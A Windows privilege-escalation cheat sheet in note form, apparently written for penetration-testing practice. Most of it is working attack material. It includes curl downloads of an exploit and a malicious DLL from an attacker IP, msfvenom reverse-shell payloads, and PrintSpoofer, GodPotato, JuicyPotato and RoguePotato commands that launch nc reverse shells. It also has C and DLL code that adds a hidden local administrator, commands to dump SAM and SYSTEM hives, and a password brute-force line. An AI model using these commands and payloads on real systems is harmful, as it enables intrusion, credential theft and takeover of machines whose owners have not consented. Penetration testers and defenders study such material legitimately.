
#### SID

```
S-1-0-0                       Nobody        
S-1-1-0	                      Everybody
S-1-5-11                      Authenticated Users
S-1-5-18                      Local System
S-1-5-domainidentifier-500    Administrator
```

#### Credential Access

- reused passwords
- credentials from config file
- credentials from local DB
- credentials from cmdkey (`cmdkey /list`): https://hacklido.com/blog/542-privileges-escalation-techniques-basic-to-advanced-for-windows-part-3
- credentials from log file
- user groups
- can read SAM and SYSTEM files
- brute force attack
```
crackmapexec ssh <ip> -u <user> -p /usr/share/wordlists/rockyou.txt
```

#### Abusing Tokens

- SeImpersonatePrivilege
- SeAssignPrimaryTokenPrivilege
- SeDebugPrivilege
	- run mimikatz
- SeRestorePrivilege
	- get SAM and SYSTEM files
	- open cmd as system if you have rdp
- SeBackupPrivilege
	- get SAM and SYSTEM files
		- `reg save hklm\sam C:\temp\sam.hive`
		- `reg save hklm\system C:\temp\system.hive`
	- open cmd as system if you have rdp
	- read any file: Acl-FullControl.ps1
- SeManageVolumePrivilege / SeChangeNotifyPrivilege - This exploit grants full permission on C:\ drive for all users on the machine
```
#PE
# download SeManageVolumeExploit.exe to target
# https://github.com/CsEnox/SeManageVolumeExploit
curl http://192.168.45.224:8000/SeManageVolumeExploit.exe -o SeManageVolumeExploit.exe

# run it - after we get permmisions to write to c:\
.\SeManageVolumeExploit.exe

# PoC
echo "hi" > test.txt

# generate malicious dll
# tzres.dll used when we execute "systeminfo" command
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.224 LPORT=9999 -f dll -o tzres.dll

# download it to the right path
curl http://192.168.45.224:8000/tzres.dll -o C:\windows\system32\wbem\tzres.dll

# execute 
systeminfo
```


offers the possibility to leverage a token with another security context. Meaning, a user with this privilege can perform operations in the security context of another user account under the right circumstances. By default, Windows assigns this privilege to members of the local _Administrators_ group

tools: 
- PrintSpoofer
```
.\printspoofer64.exe -i -c cmd
.\PrintSpoofer64.exe -c "nc.exe <attacket ip> <attacker port> -e powershell"
```
- RottenPotato
- GodPotato
```
# check .NET version
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"

# fit the right version
.\GodPotato-NET<version>.exe -cmd ".\nc.exe <attacker ip> <attacker port> -e cmd"
```
- SweetPotato
```
.\SweetPotato.exe -p sys.exe
```
- JuicyPotato
```
.\JuicyPotato.exe -l 9999 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c .\nc.exe 192.168.45.221 9999 -e powershell"
```
- metasploit - getsystem
- RoguePotato
```
.\RoguePotato.exe -r <kali_ip> -e ".\nc.exe <attacket ip> <attacker port> -e powershell" -l <listen_port>
```
#### levels of running process

```
- System: SYSTEM (kernel, ...)
- High: Elevated users
- Medium: Standard users
- Low: Very restricted rights often used in sandboxed[^privesc_win_sandbox] processes or for directories storing temporary data
- Untrusted: Lowest integrity level with extremely limited access rights for processes or objects that pose the most potential risk
```

list all process
```
# powershell
Get-Process
Get-Process <process_name> -FileVersionInfo

# cmd
wmic process list full
```

#### Service Binary Hijacking

if we have permissions to RW of F on exe of service we can replace it with custom exe that create new user as local admin

- need to check if the service running with high privilege
- don't choose services that running under c:\\windows

tools:
- check running services - won't work when using a network logon such as WinRM or a bind shell
- **check not running services as well!**
```
# powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto"


wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"

# evil-winrm
services
```

- check under which user this service is running 
```
sc.exe qc <service name>
```

- check permissions on the exe
```
# File permission
icacls "<exe_path>

# Folder Permission
icacls "<folder_path>"
```

- revers shell as the running service user
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=9999 -f exe -o sys.exe
```

- or add user as local admin script
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  i = system("powershell -Command \"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'dave2'\"");
  
  return 0;
}
```

compile on kali
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

locate in the right path and restart the service
```
sc.exe stop <service name>
sc.exe start <service name>
```
#### change Service Binary Location

if the service is misconfigure you may can change the path that the services running from to your exe file like c:\\temp\\revershell.exe   
```
sc.exe config <service name> binPath= <binary path>
```
#### Service DLL Hijacking

when we have service that running an exe, using procmon we can see that he couldn't find his dll or find after several checks in another locations. we can leverage that and create custom DLL that it load first and run it

tools:
- check running process - won't work when using a network logon such as WinRM or a bind shell
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# evil-winrm
services
```

- check under which user this service is running 
```
sc.exe qc <service name>
```

- check permissions on the exe
```
icacls "<exe_path>"
```

- add user as local admin script
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
  	    i = system("powershell -Command \"Add-LocalGroupMember -Group 'Remote Desktop Users' -Member 'dave2'\"");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

compile on kali
```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

or revers shell as the running service user
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=9999 -f dll > beyondhelper.dll
```

locate in the right path and restsrt the service
```
sc.exe stop <service name>
sc.exe start <service name>
```
#### Unquoted Service Paths

when there are services that running and in the name of the path there are space between two words, we can abuse the way that the the service search for the exe and create our own exe
for example:
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

tools:

- enumerate running and stopped services
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# run in cmd
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

# evil-winrm
services
```

- check under which user this service is running 
```
sc.exe qc <service name>
```

- add user as local admin script
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

compile on kali
```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

or revers shell as the running service user
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.221 LPORT=9999 -f exe -o sys.exe
```

locate in the right path and restsrt the service
```
sc.exe stop <service name>
sc.exe start <service name>
```
#### Scheduled Tasks

- abusing the executable file
- abusing a dependency files 

schedules tasks that not create by system
```
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft*' -and $_.Principal.UserId -ne 'SYSTEM' }
```

check permissions on the exe
```
icacls "<exe_path>"
```

modify the exe and wait until the next run 
#### Using Exploits

- exploit _application-based_ vulnerabilities - installed applications on a Windows system may contain different types of vulnerabilities
- exploit vulnerabilities in the Windows Kernel
- exploit in running services
- search for cves: https://github.com/rasta-mouse/Watson, https://github.com/rasta-mouse/Sherlock

Local Privilege Escalation (MS11-046) - https://www.exploit-db.com/exploits/40564
smbghost - https://kashz.gitbook.io/common-exploits/windows-exploits/smbghost
windows server 2008 standard 6001 privilege escalation: https://www.exploit-db.com/exploits/40564